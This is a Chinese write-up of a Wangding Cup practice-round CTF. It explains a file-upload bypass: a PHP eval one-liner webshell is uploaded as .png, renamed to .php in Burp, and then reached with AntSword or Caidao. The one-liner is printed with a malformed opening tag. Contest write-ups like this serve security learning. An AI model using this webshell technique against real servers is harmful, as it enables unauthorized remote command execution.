---
title: 【相关分享】网鼎杯拟赛 Writeup
contest: 网鼎杯
year: 2024
difficulty: easy
vuln_type: upload
tags: [拟赛, 签到题, upload.php, 一句话后门, Burp抓包改后缀, 文件上传, 隼目安全]
attack_chain: 1. 签到题：看群公告 /2. /upload.php 上传 PHP 一句话改 .png 后缀 /3. Burp 抓包改后缀 .php /4. 中国蚁剑 / 菜刀连接 webshell /5. 找 flag 文件
key_payload: /upload.php  .png 改 .php  Content-Type: multipart/form-data
one_liner: 网鼎杯拟赛 Writeup，签到题 + Web 文件上传改后缀 bypass。
lesson: 文件上传经典 bypass：先传 .png 再 Burp 改后缀；Content-Type 检查可绕过；后门落地用中国蚁剑/菜刀。
quality: medium
---

# 【相关分享】网鼎杯拟赛 Writeup

## 概览
网鼎杯拟赛 Writeup，签到题 + Web 文件上传。

## 签到题
- 看群公告拿 flag

## web1
- 访问 `/upload.php`
- PHP 一句话先改 .png 后缀上传
- Burp 抓包修改后缀为 .php

### 数据包示例
```http
POST /upload.php HTTP/1.1
Host: 0192c657e8dd71c2831bd489d75161e6.0h49.dg01.wangdingcup.com:43000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
...
Content-Type: multipart/form-data; boundary=---------------------------234681467240373262723660237873
Content-Length: 514

<一句话 .php 内容>
```

### 攻击步骤
1. 一句话：`<php @eval($_POST['cmd']);?>` 保存为 `1.png`
2. 上传到 `/upload.php`
3. Burp 抓包改 `1.png` 为 `1.php`
4. 中国蚁剑 / 菜刀连接 webshell
5. 找 flag 文件

## 经验提炼
- 文件上传经典 bypass：先传 .png 再 Burp 改后缀
- Content-Type 检查可绕过
- 后门落地用中国蚁剑/菜刀
- 网鼎杯是阿里/百度/奇安信等大厂联合赛事
- 拟赛是模拟赛，与正式赛类似
- @eval($_POST[]) 是经典 PHP 一句话
- multipart/form-data 是文件上传标准
- 拟赛 flag 可能是 fake flag
- 隼目安全是 WP 转载方
- 抓包改后缀是入门级 WAF 绕过
